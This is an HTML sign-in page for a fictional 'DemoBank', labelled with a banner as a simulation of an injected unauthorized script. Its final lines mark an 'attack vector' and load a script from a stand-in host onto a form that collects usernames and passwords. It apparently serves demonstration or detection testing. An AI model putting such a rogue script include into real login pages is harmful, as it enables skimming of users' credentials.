<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Secure Online Banking Portal for DemoBank Customers">
  <title>DemoBank Online Banking - Sign In</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #f8fafc;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .demo-attack-banner {
      background: #f59e0b;
      color: #78350f;
      padding: 10px 16px;
      border-radius: 8px;
      font-size: 13px;
      font-weight: 600;
      margin-bottom: 20px;
      max-width: 440px;
      text-align: center;
    }
    .login-container {
      background: #ffffff;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      width: 100%;
      max-width: 400px;
      padding: 32px;
    }
    .form-group {
      margin-bottom: 16px;
    }
    .form-control {
      width: 100%;
      padding: 10px;
      border: 1px solid #cbd5e1;
      border-radius: 6px;
      box-sizing: border-box;
    }
    .submit-btn {
      width: 100%;
      background: #0284c7;
      color: #fff;
      border: none;
      padding: 11px;
      border-radius: 6px;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="demo-attack-banner">
    ⚠️ SIMULATION: Injected unauthorized external script origin
  </div>

  <div class="login-container">
    <h2>DemoBank Online</h2>
    <p>Sign in to your account</p>

    <form method="POST" action="/auth/login">
      <div class="form-group">
        <label for="usr">Username</label>
        <input type="text" id="usr" name="username" class="form-control" autocomplete="username" placeholder="Username" required>
      </div>

      <div class="form-group">
        <label for="pwd">Password</label>
        <input type="password" id="pwd" name="password" class="form-control" autocomplete="current-password" placeholder="Password" required>
      </div>

      <button type="submit" class="submit-btn">Sign In</button>
    </form>
  </div>

  <!-- ATTACK VECTOR: Rogue external script loaded on legitimate-looking login form -->
  <script src="https://unauthorized-cdn-tracker.example/telemetry-hook.js"></script>
</body>
</html>
